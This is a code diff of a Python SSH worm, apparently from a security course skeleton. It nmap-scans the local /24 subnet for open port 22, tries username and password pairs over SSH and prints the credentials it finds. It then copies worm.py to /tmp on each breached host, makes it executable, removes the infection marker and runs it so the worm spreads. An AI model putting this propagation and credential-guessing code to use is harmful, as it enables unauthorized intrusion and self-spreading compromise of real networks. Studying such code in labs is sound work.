@@ -97,7 +97,7 @@ def tryCredentials(host, userName, password, sshClient):
 	# in the comments above the function
 	# declaration (if you choose to use
 	# this skeleton).
-	print userName + "," + password + "," + host
+	print "Trying " + userName + ", " + password + " on " + host
 	try:
 		connection_result = sshClient.connect(host, username = userName, password = password)
 		print "good connection" 
@@ -170,20 +170,15 @@ def getHostsOnTheSameNetwork():
 	# for hosts on the same network
 	# and return the list of discovered
 	# IP addresses.
-	interface_list = netinfo.list_devs()
 	portScanner = nmap.PortScanner()
-	interface = ""
-	for i in interface_list:
-		if i == "enp0s3":
-			interface = i 
-	portScanner.scan(getMyIP(interface) + "/24",  arguments='-p 22 --open')
+	portScanner.scan(getMyIP("enp0s3") + "/24",  arguments='-p 22 --open')
 	hostInfo = portScanner.all_hosts()
 	return hostInfo
 
 
 def removeSelfFromIpList(networkHosts):
 	for host in networkHosts:
-		if host == myIp:
+		if host == getMyIP("enp0s3"):
 			networkHosts.remove(host)
 
 
@@ -204,13 +199,15 @@ def spreadAndRemove():
 		removeSelfFromIpList(networkHosts)
 		for host in networkHosts:
 			sshInfo = attackSystem(host)
-			print sshInfo
 			if sshInfo:
+				print "Found credentials: "
+				print sshInfo[1] + "," + sshInfo[2] + "\n"
 				print 'trying to spread'
 				try:
 					sftpClient = sshInfo[0].open_sftp()
 					sftpGetOrThrowException(sshInfo[0])
 					sftpClient.put("worm.py", "/tmp/worm.py")
+					sshClient = sshInfo[0]					
 					sshClient.exec_command("chmod a+rwx /tmp/worm.py")
 					sshClient.exec_command("rm /tmp/infected.txt")
 					sshClient.exec_command("python /tmp/worm.py r")
@@ -272,10 +269,11 @@ if networkHosts is not None:
 
 		# Try to attack this host
 		sshInfo = attackSystem(host)
-		print sshInfo
 
 		# Did the attack succeed?
 		if sshInfo:
+			print "Found credentials: "
+			print sshInfo[1] + ", " + sshInfo[2]
 			print "Trying to spread"
 			# TODO: Check if the system was
 			# already infected. This can be
